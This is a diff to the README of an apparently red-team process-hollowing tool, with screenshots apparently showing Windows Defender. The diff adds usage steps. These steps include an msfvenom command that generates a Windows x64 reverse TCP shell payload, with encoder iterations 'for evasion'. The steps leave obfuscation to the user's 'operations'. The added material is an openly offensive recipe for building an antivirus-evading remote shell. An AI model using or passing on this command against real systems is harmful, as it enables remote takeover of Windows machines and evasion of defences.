@@ -26,3 +26,13 @@ We suggest to use directly compiled executables as in some situations it depends
 ![windef-2](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/ca002758-e1e4-43b3-be87-7a59242f80f5)
 
 ![windows-def](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/dc8b587a-10f4-4408-8203-539640b50cde)
+
+#How to use
+
+***1. Generate a .bin file only - You can use C2 servers and metasploit too***
+
+Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST<IP> LPORT<PORT> -f raw -i <iterations as you want for evasion> -e <encoder you want to use> > shell.bin - **x64-Bit**
+  
+ ***2. Obfuscation is mainly your work to do as per your operations. The other one's? - WE'LL HANDLE!!!***
+  
+  
